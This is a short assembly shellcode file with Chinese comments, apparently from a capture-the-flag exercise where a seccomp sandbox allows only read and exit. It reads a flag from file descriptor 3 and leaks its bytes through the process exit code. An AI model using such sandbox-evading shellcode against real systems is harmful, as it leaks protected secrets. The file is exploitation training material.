# 限制使用read和exit() 0 60
# 明显是需要用exit(n)来反复读取flag叻=。=
# 需要写一个pwntools的利用, 方便一些
# 有点麻烦, 但不难


.global _start
_start:
.intel_syntax noprefix
        # read(3, *buf, 500)
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0
        mov rdi, 3
        lea rsi, [rip+data]
        mov rdx, 100
        syscall
        # exit(int)
        mov rax, 60
        mov edi, dword ptr [rsi]
        syscall
data:
        .string ""
